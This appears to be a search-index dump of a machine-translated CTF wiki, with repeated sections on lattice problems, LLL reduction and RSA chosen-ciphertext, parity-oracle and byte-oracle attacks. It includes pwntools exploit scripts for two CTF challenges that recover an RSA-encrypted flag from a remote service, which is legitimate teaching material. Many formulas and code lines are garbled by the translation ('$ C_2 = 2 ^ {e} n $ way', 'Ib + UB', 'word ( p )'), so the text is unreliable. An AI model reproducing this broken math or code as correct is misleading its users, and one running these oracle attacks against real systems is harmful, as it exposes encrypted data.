\\gamma ) : Given a fixed L, find the non-zero vector v in the lattice L such that for any other non-zero vector u in the lattice, || v|| \\leq \\gamma||u|| || v|| \\leq \\gamma||u|| . Successive Minima Problem (SMP) : Given a lattice L of rank n, find n linearly independent vectors s_i s_i in lattice L, satisfying \\lambda_i(L)=||s_i| |, 1\\leq i \\leq n \\lambda_i(L)=||s_i| |, 1\\leq i \\leq n . Shortest Independent Vector Problem (SIVP) : Given a lattice L of rank n, find n linear independent vectors s_i s_i in lattice L, satisfying ||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n ||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n . Unique Shortest Vector Problem (uSVP- \\gamma \\gamma ) : Given a fixed L, satisfying $ \\lambda_2(L) > \\gamma \\lambda_1(L)$, find the shortest vector of the cell. Closest Vector Problem (CVP) : Given the lattice L and the target vector t\\in R^m t\\in R^m , find a non-zero vector v in a lattice such that for any non-zero vector u in the lattice , satisfy ||vt|| \\leq ||ut|| ||vt|| \\leq ||ut|| .","title":"Introduction to Lattices"},{"location":"crypto/asymmetric/lattice/introduction/#basic-introduction","text":"","title":"Basic Introduction"},{"location":"crypto/asymmetric/lattice/introduction/#lattice-definition","text":"The lattice is the linear combination of all integer coefficients of n ( m\\geq n m\\geq n ) linearly independent vectors b_i(1\\leq i \\leq n) b_i(1\\leq i \\leq n) of the m-dimensional Euclidean space R^m R^m , ie L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\} L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\} Here B is a collection of n vectors, we call These n n vectors a set of bases of the lattice L L . The rank of the lattice L L is n n . The number of bits in L L is m m . If m = n m = n , then we call this format full rank. Of course, the space can be other groups instead of R^m R^m .","title":"Lattice Definition"},{"location":"crypto/asymmetric/lattice/introduction/#basic-definition-in-lattices","text":"","title":"Basic Definition in Lattices"},{"location":"crypto/asymmetric/lattice/introduction/#successive-minimum","text":"Let lattice L L be a lattice in the m-dimensional Euclidean space R^m R^m with rank n n , then the continuous minimum length of L L (successive minima) is \\lambda_1,...,\\lambda_n \\in R \\lambda_1,...,\\lambda_n \\in R , where for any 1 \\leq i\\leq n 1 \\leq i\\leq n , \\lambda_i \\lambda_i is the minimum value to satisfy that for i i linearly independent vectors v_i v_i , ||v_j||\\leq \\lambda_i,1\\leq j\\leq i ||v_j||\\leq \\lambda_i,1\\leq j\\leq i . Obviously we have \\lambda_i \\leq \\lambda_j ,\\forall i <j \\lambda_i \\leq \\lambda_j ,\\forall i <j \u3002","title":"Successive Minimum"},{"location":"crypto/asymmetric/lattice/introduction/#calculating-difficult-problems-in-the-lattice","text":"Shortest Vector Problem (SVP) : Given the lattice L and its base vector B, find the non-zero vector v in the lattice L such that for any other non-zero vector u in the lattice, ||v| | \\leq ||u|| ||v| | \\leq ||u|| . \\gamma \\gamma -Approximate Shortest Vector Problem (SVP- \\gamma \\gamma ) : Given a fixed L, find the non-zero vector v in the lattice L such that for any other non-zero vector u in the lattice, || v|| \\leq \\gamma||u|| || v|| \\leq \\gamma||u|| . Successive Minima Problem (SMP) : Given a lattice L of rank n, find n linearly independent vectors s_i s_i in lattice L, satisfying \\lambda_i(L)=||s_i| |, 1\\leq i \\leq n \\lambda_i(L)=||s_i| |, 1\\leq i \\leq n . Shortest Independent Vector Problem (SIVP) : Given a lattice L of rank n, find n linear independent vectors s_i s_i in lattice L, satisfying ||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n ||s_i|| \\leq \\lambda_n(L), 1\\leq i \\leq n . Unique Shortest Vector Problem (uSVP- \\gamma \\gamma ) : Given a fixed L, satisfying $ \\lambda_2(L) > \\gamma \\lambda_1(L)$, find the shortest vector of the cell. Closest Vector Problem (CVP) : Given the lattice L and the target vector t\\in R^m t\\in R^m , find a non-zero vector v in a lattice such that for any non-zero vector u in the lattice , satisfy ||vt|| \\leq ||ut|| ||vt|| \\leq ||ut|| .","title":"Calculating Difficult Problems in the Lattice"},{"location":"crypto/asymmetric/lattice/lattice-reduction/","text":"\u683c\u57fa\u89c4\u7ea6 \u00b6 Lenstra \u2013 Lenstra \u2013 Lovasz \u00b6 basic introduction \u00b6 The LLL algorithm is to find a set of bases on the lattice, which satisfies the following effects. Moreover, the following properties of the base generated by this method are very useful. Simple application \u00b6 Here I will give a second example from LLL paper. Given n real numbers \\alpha_i,...,\\alpha_n \\alpha_i,...,\\alpha_n , find the rational linear approximation of the n numbers, ie find n numbers m_i m_i , so that \\sum\\limits_{i=1}^{n }m_i\\alpha_i \\sum\\limits_{i=1}^{n }m_i\\alpha_i is equal to 0 as much as possible. We can construct a matrix like this, where a_i a_i is a rational approximation of \\alpha_i \\alpha_i . A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & ca_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & c a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & c a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & c a_n \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & ca_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & c a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & c a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & c a_n \\\\ \\end{matrix} \\right] The matrix is n*(n+1), we can find the determinant corresponding to this lattice according to the method of finding the determinant. $ Det (L) = sqrt {AA} $ ^ T We further consider such a matrix A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & a_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & a_n \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & a_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & a_n \\\\ \\end{matrix} \\right] Then AA^T = \\left[ \\begin{matrix} 1+a_1^2 & a_1a_2 & a_1a_3 & \\cdots & a_1a_n \\\\ a_2a_1 & 1+a_2^2 & a_2a_3 & \\cdots & a_2a_n \\\\ a_3a_1 & a_3a_2 & 1+a_3^2 & \\cdots & a_3a_n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_na_1 & a_na_2 &a_na_3 & \\cdots & 1+a_n^2 \\\\ \\end{matrix} \\right] AA^T = \\left[ \\begin{matrix} 1+a_1^2 & a_1a_2 & a_1a_3 & \\cdots & a_1a_n \\\\ a_2a_1 & 1+a_2^2 & a_2a_3 & \\cdots & a_2a_n \\\\ a_3a_1 & a_3a_2 & 1+a_3^2 & \\cdots & a_3a_n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_na_1 & a_na_2 &a_na_3 & \\cdots & 1+a_n^2 \\\\ \\end{matrix} \\right] Further, let's try it from low-dimensional to high-dimensional (strictly prove that you can consider adding a row and a column, the upper left corner is 1), and the determinant of the lattice is \\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2} \\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2} Can refer to the following proof of the postgraduate Yuge Then after the LLL algorithm, we can get ||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}} ||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}} In general, the latter item tends to 1 when it is opened n times, because a_i a_i is a constant and is generally not related to n, so ||b_1|| \\leq 2^{\\frac{n-1}{4}}*k ||b_1|| \\leq 2^{\\frac{n-1}{4}}*k k is relatively small. In addition, b_1 b_1 is a linear combination of the original vectors, then b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i Obviously if c is large enough, then the subsequent summation must be small enough to satisfy the above constraints. Reference \u00b6 Survey: Lattice Reduction Attacks on RSA","title":"Lattice-based Algorithm"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#_1","text":"","title":"\u683c\u57fa\u89c4\u7ea6"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#lenstra-lenstra-lovasz","text":"","title":"Lenstra \u2013 Lenstra \u2013 Lovasz"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#basic-introduction","text":"The LLL algorithm is to find a set of bases on the lattice, which satisfies the following effects. Moreover, the following properties of the base generated by this method are very useful.","title":"basic introduction"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#simple-application","text":"Here I will give a second example from LLL paper. Given n real numbers \\alpha_i,...,\\alpha_n \\alpha_i,...,\\alpha_n , find the rational linear approximation of the n numbers, ie find n numbers m_i m_i , so that \\sum\\limits_{i=1}^{n }m_i\\alpha_i \\sum\\limits_{i=1}^{n }m_i\\alpha_i is equal to 0 as much as possible. We can construct a matrix like this, where a_i a_i is a rational approximation of \\alpha_i \\alpha_i . A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & ca_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & c a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & c a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & c a_n \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & ca_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & c a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & c a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & c a_n \\\\ \\end{matrix} \\right] The matrix is n*(n+1), we can find the determinant corresponding to this lattice according to the method of finding the determinant. $ Det (L) = sqrt {AA} $ ^ T We further consider such a matrix A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & a_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & a_n \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & a_1 \\\\ 0 & 1 & 0 & \\cdots & 0 & a_2 \\\\ 0 & 0 & 1 & \\cdots & 0 & a_3 \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & a_n \\\\ \\end{matrix} \\right] Then AA^T = \\left[ \\begin{matrix} 1+a_1^2 & a_1a_2 & a_1a_3 & \\cdots & a_1a_n \\\\ a_2a_1 & 1+a_2^2 & a_2a_3 & \\cdots & a_2a_n \\\\ a_3a_1 & a_3a_2 & 1+a_3^2 & \\cdots & a_3a_n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_na_1 & a_na_2 &a_na_3 & \\cdots & 1+a_n^2 \\\\ \\end{matrix} \\right] AA^T = \\left[ \\begin{matrix} 1+a_1^2 & a_1a_2 & a_1a_3 & \\cdots & a_1a_n \\\\ a_2a_1 & 1+a_2^2 & a_2a_3 & \\cdots & a_2a_n \\\\ a_3a_1 & a_3a_2 & 1+a_3^2 & \\cdots & a_3a_n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_na_1 & a_na_2 &a_na_3 & \\cdots & 1+a_n^2 \\\\ \\end{matrix} \\right] Further, let's try it from low-dimensional to high-dimensional (strictly prove that you can consider adding a row and a column, the upper left corner is 1), and the determinant of the lattice is \\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2} \\sqrt{1+\\sum\\limits_{i=1}^n\\alpha_i^2} Can refer to the following proof of the postgraduate Yuge Then after the LLL algorithm, we can get ||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}} ||b_1|| \\leq 2^{\\frac{n-1}{4}} (1+\\sum\\limits_{i=1}^n\\alpha_i^2)^{\\frac{1}{2(n+1)}} In general, the latter item tends to 1 when it is opened n times, because a_i a_i is a constant and is generally not related to n, so ||b_1|| \\leq 2^{\\frac{n-1}{4}}*k ||b_1|| \\leq 2^{\\frac{n-1}{4}}*k k is relatively small. In addition, b_1 b_1 is a linear combination of the original vectors, then b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i b_1[n]=\\sum\\limits_{i=1}^{n}m_ic*a_i=c\\sum\\limits_{i=1}^{n}m_i*a_i Obviously if c is large enough, then the subsequent summation must be small enough to satisfy the above constraints.","title":"Simple application"},{"location":"crypto/asymmetric/lattice/lattice-reduction/#reference","text":"Survey: Lattice Reduction Attacks on RSA","title":"Reference"},{"location":"crypto/asymmetric/lattice/overview/","text":"\u683c\u6982\u8981 \u00b6 Lattice has at least two meanings in mathematics Define a partial order set L on a non-empty finite set that satisfies any element a, b in set L such that a, b has a maximum lower bound, and a minimum upper bound in L. See https://en.wikipedia.org/wiki/Lattice_(order ) for details. The definition in group theory is a subset of R^n R^n that satisfies a certain property. Of course, it can also be other groups. At present, the research on the lattice mainly has the following major directions. The difficulty of calculating problems in the lattice, that is, the computational complexity of these problems, mainly including SVP problem CVP issues How to solve the difficult problem in the lattice, there are both approximate algorithms and some precision algorithms. Lattice-based cryptanalysis, that is, how to use lattice theory to analyze some existing cryptographic algorithms. Knapsack cryptosystems DSA nonce biases Factoring RSA keys with bits known Small RSA private exponents Stereotyped messages with small RSA exponents How to design a new cryptosystem based on the problem of lattice difficulty, which is also one of the important research directions in the post-quantum cryptosystem. Fully homomorphic encryption The Goldreich\u2013Goldwasser\u2013Halevi (GGH) cryptosystem The NTRU cryptosystem The Ajtai\u2013Dwork cryptosystem and the LWE cryptosystem","title":"Lattice Overview"},{"location":"crypto/asymmetric/lattice/overview/#_1","text":"Lattice has at least two meanings in mathematics Define a partial order set L on a non-empty finite set that satisfies any element a, b in set L such that a, b has a maximum lower bound, and a minimum upper bound in L. See https://en.wikipedia.org/wiki/Lattice_(order ) for details. The definition in group theory is a subset of R^n R^n that satisfies a certain property. Of course, it can also be other groups. At present, the research on the lattice mainly has the following major directions. The difficulty of calculating problems in the lattice, that is, the computational complexity of these problems, mainly including SVP problem CVP issues How to solve the difficult problem in the lattice, there are both approximate algorithms and some precision algorithms. Lattice-based cryptanalysis, that is, how to use lattice theory to analyze some existing cryptographic algorithms. Knapsack cryptosystems DSA nonce biases Factoring RSA keys with bits known Small RSA private exponents Stereotyped messages with small RSA exponents How to design a new cryptosystem based on the problem of lattice difficulty, which is also one of the important research directions in the post-quantum cryptosystem. Fully homomorphic encryption The Goldreich\u2013Goldwasser\u2013Halevi (GGH) cryptosystem The NTRU cryptosystem The Ajtai\u2013Dwork cryptosystem and the LWE cryptosystem","title":"\u683c\u6982\u8981"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/","text":"RSA Selecting a clear ciphertext attack \u00b6 Select plaintext attack \u00b6 Here is an example, if we have an encryption oracle, but we don't know n and e, then We can get n by encrypting oracle. When e is small ( e<2^{64} e&lt;2^{64} ), we can use the Pollard's kangaroo algorithm algorithm to get e. This is more obvious. We can encrypt 2, 4, 8, and 16. Then we can know $ C_2 = 2 ^ {e} n $ way C_4 = $ 4 ^ {e} n $ way $ C_8 = 8 ^ {e} n $ way Then c_2^2 \\equiv c_4 \\bmod n c_2^2 \\equiv c_4 \\bmod n c_2^3 \\equiv c_8 \\bmod n c_2^3 \\equiv c_8 \\bmod n Therefore c_2^2-c_4=kn c_2^2-c_4=kn $ c_2 ^ 3-c_8 = tn $ We can find the greatest common factor of kn and tn, and the big probability is n. We can also construct more examples to find n more deterministically. Any ciphertext decryption \u00b6 Suppose Alice creates the ciphertext C = P^e \\bmod n C = P^e \\bmod n and sends C to Bob, and assuming we want to decrypt any ciphertext encrypted by Alice, instead of just decrypting C, then we can intercept C, and use the following steps to find P: Select any X\\in Z_n^{*} X\\in Z_n^{*} , ie X and N. Calculate Y=C \\times X^e \\bmod n Y=C \\times X^e \\bmod n Since we can choose to ciphertext attack, we find the decryption result corresponding to Y Z=Y^d Z=Y^d Then, since Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= PX\\bmod n Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= PX\\bmod n , since X and N are mutually prime, we are very It is easy to find the corresponding inverse element, and then you can get P RSA parity oracle \u00b6 Suppose there is currently an Oracle that decrypts a given ciphertext and checks the parity of the decrypted plaintext and returns the corresponding value based on parity, such as 1 for odd numbers and 0 for even numbers. Then given an encrypted ciphertext, we only need log(N) times to know the plaintext message corresponding to this ciphertext. Principle \u00b6 Hypothesis P $ C = e ^ N $ way The first time we can send to the server $ C * 2 ^ = e (2P) e ^ N $ way The server will calculate 2P $ N $ way Here 2P is an even number and its power is even. N is an odd number because it is multiplied by two large prime numbers. Then The server returns an odd number, ie 2P \\bmod N 2P \\bmod N is an odd number, indicating that 2P is greater than N, and an odd number of Ns is subtracted, and because 2P<2N 2P&lt;2N , an N is subtracted, ie \\frac{N }{2} \\leq P < N \\frac{N }{2} \\leq P &lt; N , we can also consider rounding down. If the server returns an even number, then 2P is less than N. That is, 0\\leq P < \\frac{N}{2} 0\\leq P &lt; \\frac{N}{2} , we can also round down. Here we use mathematical induction, which assumes that at the ith time, \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \\frac{xN}{2^{i}} \\leq P &lt; \\frac{xN+N}{2^{i}} Further, at the i+1th time, we can send C*2^{(i+1)e} C*2^{(i+1)e} The server will calculate $ 2 ^ {i + 1} P way N = 2 ^ {i + 1} P $ kN 0 \\leq 2^{i+1}P-kN<N 0 \\leq 2^{i+1}P-kN<N $ frac {kN} {2 ^ {i + 1}} leq P < frac {kN + N} According to the result of the ith \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} Then If the server returns an odd number, then k must be an odd number, k=2y+1, then \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^ {i+1}} \\frac{2yN+N}{2^{i+1}} \\leq P &lt; \\frac{2yN+2N}{2^ {i+1}} . At the same time, since P necessarily exists, the range obtained by the i+1 and the range obtained by the i-th must have an intersection. So y must be equal to x. If the server returns an even number, then k must be an even number, k=2y, where y must also be equal to x, then \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+ N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P &lt; \\frac{2xN+ N}{2^{i+1}} Further we can conclude lb = 0 ub = N if server returns 1 lb = ( lb + ub ) / 2 else : UB = ( Ib + UB ) / 2 Although it is divisible, that is, it is rounded down, but it does not matter that we have analyzed this problem at the beginning. 2018 Google CTF Perfect Secrecy \u00b6 Here is an example of the 2018 Google CTF topic. #!/usr/bin/env python3 import sys import random from cryptography.hazmat.primitives import serialization from cryptography.hazmat.backends import default_backend def ReadPrivateKey ( filename ): return serialization . load_pem_private_key ( open ( filename , 'rb' ) . read (), password = None , backend = default_backend ()) def RsaDecrypt ( private_key , ciphertext ): assert ( len ( ciphertext ) <= ( private_key . public_key () . key_size // 8 )), 'Ciphertext too large' return pow ( int . from_bytes ( ciphertext , 'big' ), private_key . private_numbers () . d , private_key . public_key () . public_numbers () . n ) def Challenge ( private_key , reader , writer ): try : m0 = reader . read ( 1 ) m1 = reader . read ( 1 ) ciphertext = reader . read ( private_key . public_key () . key_size // 8 ) dice = RsaDecrypt ( private_key , ciphertext ) for rounds in range ( 100 ): p = [ m0 , m1 ][ dice & 1 ] k = random . randint ( 0 , 2 ) c = ( word ( p ) + k ) % 2 writer . write ( bytes (( c ,))) writer . flush () return 0 except Exception as e : return 1 def main (): private_key = ReadPrivateKey ( sys . argv [ 1 ]) return Challenge ( private_key , sys . stdin . buffer , sys . stdout . buffer ) if __name__ == '__main__' : sys . exit ( main ()) As can be seen We can give the server two numbers, and the server will decide which one to use based on the decrypted ciphertext content. The server will use random.randint(0, 2) to generate a random number and output the associated random 01 byte c. At first glance, it seems to be completely random. Check out random.randint(0, 2) to know that the generated random number is bounded, so the probability of generating an even number is greater than the probability of generating an odd number, then c and p The probability of the same parity is \u2154. Furthermore, by setting m0 and m1, we can know whether the last digit of the decrypted ciphertext is 0 or 1. This is actually the RSA parity oracle. Exp is as follows import gmpy2 from pwn import * encflag = open ( './flag.txt' ) . read () encflag = encflag . encode ( 'hex' ) encflag = int ( encflag , 16 ) #context.log_level = 'debug' m = [ ' \\x00 ' , ' \\x07 ' ] n = 0xDA53A899D5573091AF6CC9C9A9FC315F76402C8970BBB1986BFE8E29CED12D0ADF61B21D6C281CCBF2EFED79AA7DD23A2776B03503B1AF354E35BF58C91DB7D7C62F6B92C918C90B68859C77CAE9FDB314F82490A0D6B50C5DC85F5C92A6FDF19716AC8451EFE8BBDF488AE098A7C76ADD2599F2CA642073AFA20D143AF403D1 e = 65537 flag = \"\" def guessvalue ( cnt ): if cnt [ 0 ] > cnt [ 1 ]: return 0 return 1 i = 0 while True : cnt = dict () cnt [ 0 ] = cnt [ 1 ] = 0 p = remote ( 'perfect-secrecy.ctfcompetition.com' , 1337 ) p . send ( m [ 0 ]) p . send ( m [ 1 ]) tmp = pow ( 2 , i ) two_inv = gmpy2 . invert ( tmp , n ) two_cipher = gmpy2 . powmod ( two_inv , e , n ) tmp = encflag * two_cipher % n tmp = hex ( tmp )[ 2 :] . strip ( 'L' ) tmp = '0' * ( 256 - len ( tmp )) + tmp tmp = tmp . decode ( 'hex' ) assert ( len ( tmp ) == 128 ) p . send ( tmp ) #print tmp data = \"\" while ( len ( data ) != 100 ): data += p . recv () for c in data : cnt [ U8 ( c )] + = 1 p . close () flag = str ( guessvalue ( cnt )) + flag print i , flag i += 1 Results are as follows 6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270 6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270 After decoding, you can get flag CTF { h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337 } Title \u00b6 2016 Plaid CTF rabit 2016 sharif CTF lsb-oracle-150 2018 Backdoor CTF BIT-LEAKER 2018 XMAN trials baby RSA RSA Byte Oracle \u00b6 Suppose there is currently an Oracle that decrypts a given ciphertext and gives the last byte of the plaintext. Then given an encrypted ciphertext, we only need \\log_{256}n \\log_{256}n times to know the plaintext message corresponding to this ciphertext. Principle \u00b6 This is actually an extension of RSA parity Oracle. Since the last byte can be revealed, then the number of times we get the ciphertext corresponding plaintext should be reduced. Hypothesis P $ C = e ^ N $ way The first time we can send to the server C $ 256 * e ^ = (256P) e ^ N $ way The server will calculate 256P $ N $ way Here 256P is an even number. N is an odd number because it is multiplied by two large prime numbers. Since P is generally less than N, then 256P \\bmod N=256P-kn, k<256 256P \\bmod N=256P-kn, k&lt;256 . And for two different k_1, k_2 k_1, k_2 , we have 256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256 256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256 We can use the counter-evidence method to prove the above inequality. At the same time, the last byte of 256P-kn 256P-kn is actually -kn -kn obtained in the case of modulo 256. So, in fact, we can first enumerate the last byte in the case of 0~255, construct a mapping table of k and the last byte. When the server returns the last byte b, we can know k according to the mapping table constructed above, that is, subtract k N, that is, kN \\leq 256 P \\leq (k+1)N kN \\leq 256 P \\leq (k+1)N . After that, we use mathematical induction to obtain the range of P, that is, assume that at the ith time, \\frac{xN}{256^{i}} \\leq P < \\frac{xN+N}{256^{i }} \\frac{xN}{256^{i}} \\leq P &lt; \\frac{xN+N}{256^{i }} Further, at the i+1th time, we can send C*256^{(i+1)e} C*256^{(i+1)e} The server will calculate $ 256 ^ {i + 1} P way N = 256 ^ {i + 1} P $ kN 0 \\leq 256^{i+1}P-kN<N 0 \\leq 256^{i+1}P-kN<N $ frac {kN} {256} {i + 1}} leq P < frac {kN + N} According to the result of the ith \\frac{256xN}{256^{i+1}} \\leq P < \\frac{256xN+256N}{256^{i+1}} \\frac{256xN}{256^{i+1}} \\leq P < \\frac{256xN+256N}{256^{i+1}} We can assume k=256y+t k=256y+t here, and the t here is what we can get through the mapping table. \\frac{256yN+tN}{256^{i+1}} \\leq P < \\frac{256yN+(t+1)N}{256^{i+1}} \\frac{256yN+tN}{256^{i+1}} \\leq P < \\frac{256yN+(t+1)N}{256^{i+1}} At the same time, since P necessarily exists, the range obtained by the i+1 and the range obtained by the i-th must have an intersection. So y must be equal to x. Further we can summarize this, in the initial case lb = 0 ub = N Suppose the server returns b, then k = mab [ b ] interval = ( ub - lb ) / 256 lb = lb + interval * k ub = lb + interval 2018 HITCON lost key \u00b6 This is a comprehensive topic. First, we don't give n. We can use the method of selecting a plaintext attack to get n. Of course, we can further obtain e. Finally, the code is as follows. from pwn import * import gmpy2 from fractions import Fraction p = process ( './rsa.py' ) #p = remote('18.179.251.168', 21700) #context.log_level = 'debug' p . recvuntil ( 'Here is the flag! \\n ' ) flagcipher = int ( p . recvuntil ( ' \\n ' , drop = True ), 16 ) def long_to_hex ( n ): s = hex ( n )[ 2 :] . rstrip ( 'L' ) if len ( s ) % 2 : s = '0' + s return s def send ( ch , num ): p . sendlineafter ( 'cmd: ' , ch ) p . sendlineafter ( 'input: ' , long_to_hex ( num )) data = p . recvuntil ( ' \\n ' ) return int ( data , 16 ) if __name__ == \"__main__\" : # get n cipher2 = send ( 'A' , 2 ) cipher4 = send ( 'A' , 4 ) nset = [] nset . append ( cipher2 * cipher2 - cipher4 ) cipher3 = send ( 'A' , 3 ) cipher9 = send ( 'A' , 9 ) nset . append ( cipher3 * cipher3 - cipher9 ) cipher5 = send ( 'A' , 5 ) cipher25 = send ( 'A' , 25 ) nset . append ( cipher5 * cipher5 - cipher25 ) n = nset [ 0 ] for item in nset : n = gmpy2 . gcd ( item , n ) # get map between k and return byte submap = {} for i in range ( 0 , 256 ): submap [ - n * i % 256 ] = i # get cipher256 cipher256 = send ( 'A' , 256 ) back = flagcipher L = Fraction ( 0 , 1 ) R = Fraction ( 1 , 1 ) for i in range ( 128 ): print i flagcipher = flagcipher * cipher256 % n b = send ( 'B' , flagcipher ) k = submap [ b ] L , R = L + ( R - L ) * Fraction ( k , 256 ), L + ( R - L ) * Fraction ( k + 1 , 256 ) low = int ( L * n ) print long_to_hex ( low - low % 256 + send ( 'B' , back )) . decode ( 'hex' ) Reference \u00b6 https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack https://pastebin.com/KnEUSMxp","title":"Chosen Plain Cipher Attack"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-selecting-a-clear-ciphertext-attack","text":"","title":"RSA Selecting a clear ciphertext attack"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#select-plaintext-attack","text":"Here is an example, if we have an encryption oracle, but we don't know n and e, then We can get n by encrypting oracle. When e is small ( e<2^{64} e&lt;2^{64} ), we can use the Pollard's kangaroo algorithm algorithm to get e. This is more obvious. We can encrypt 2, 4, 8, and 16. Then we can know $ C_2 = 2 ^ {e} n $ way C_4 = $ 4 ^ {e} n $ way $ C_8 = 8 ^ {e} n $ way Then c_2^2 \\equiv c_4 \\bmod n c_2^2 \\equiv c_4 \\bmod n c_2^3 \\equiv c_8 \\bmod n c_2^3 \\equiv c_8 \\bmod n Therefore c_2^2-c_4=kn c_2^2-c_4=kn $ c_2 ^ 3-c_8 = tn $ We can find the greatest common factor of kn and tn, and the big probability is n. We can also construct more examples to find n more deterministically.","title":"Select plaintext attack"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#any-ciphertext-decryption","text":"Suppose Alice creates the ciphertext C = P^e \\bmod n C = P^e \\bmod n and sends C to Bob, and assuming we want to decrypt any ciphertext encrypted by Alice, instead of just decrypting C, then we can intercept C, and use the following steps to find P: Select any X\\in Z_n^{*} X\\in Z_n^{*} , ie X and N. Calculate Y=C \\times X^e \\bmod n Y=C \\times X^e \\bmod n Since we can choose to ciphertext attack, we find the decryption result corresponding to Y Z=Y^d Z=Y^d Then, since Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= PX\\bmod n Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= PX\\bmod n , since X and N are mutually prime, we are very It is easy to find the corresponding inverse element, and then you can get P","title":"Any ciphertext decryption"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-parity-oracle","text":"Suppose there is currently an Oracle that decrypts a given ciphertext and checks the parity of the decrypted plaintext and returns the corresponding value based on parity, such as 1 for odd numbers and 0 for even numbers. Then given an encrypted ciphertext, we only need log(N) times to know the plaintext message 